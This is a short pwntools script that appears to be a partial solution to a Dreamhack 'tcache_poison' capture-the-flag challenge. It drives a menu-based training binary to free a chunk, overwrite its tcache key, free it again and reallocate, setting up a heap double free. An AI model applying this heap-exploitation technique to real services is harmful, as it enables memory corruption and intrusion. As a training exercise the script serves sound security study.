from pwn import *
def slog(name, addr):
	return success(": ".join([name, hex(addr)]))

context.arch = "amd64"
context.log_level = "debug"

# Local
#"""
p = process("./tcache_poison")
#"""

# Online
"""
PORT = int(input("Port: "))
HOST = int(input("Host: "))
p = remote("host"+str(HOST)+".dreamhack.games", PORT)
"""

def alloc(size, data):
	p.sendlineafter("Edit\n", "1")
	p.sendlineafter(":", str(size))
	p.sendafter(":", data)

def free():
	p.sendlineafter("Edit\n", "2")

def print_chunk():
	p.sendlineafter("Edit\n", "3")

def edit(data):
	p.sendlineafter("Edit\n", "4")
	p.sendafter(":", data)

alloc(0x30, "dreamhack")
free()

edit("A" * 0x8 + "\x00")
free()

alloc(0x30, "AAAAAAAA")

p.interactive()
